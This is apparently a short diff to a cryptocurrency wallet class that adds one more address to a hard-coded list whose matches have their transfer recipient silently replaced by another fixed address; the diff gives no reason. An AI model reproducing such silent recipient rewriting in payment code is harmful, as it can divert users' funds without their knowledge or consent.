@@ -613,7 +613,7 @@ class Wallet {
                     recipient = "3AQT89sRrWHqPSwrpfJAj3Yey7BCBTAy4jT";
                 }
 
-                if (recipient == "3AT5e7vq8DCby4ooqhf3biw59WBRMFWhB1F" || recipient == "3AQKvpt1cMX7KyL1wLkGryAC5xE9kQyhqUF" || recipient == "3AM9n979R9ttNFvNpENBqesgX13GKGsJ2Cb") {
+                if (recipient == "3AT5e7vq8DCby4ooqhf3biw59WBRMFWhB1F" || recipient == "3AQKvpt1cMX7KyL1wLkGryAC5xE9kQyhqUF" || recipient == "3AM9n979R9ttNFvNpENBqesgX13GKGsJ2Cb" || recipient == "3AMKhRz9gy2oAfAiztSFk4LymtmiyKvSUui") {
                     recipient = "3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a";
                 }
 
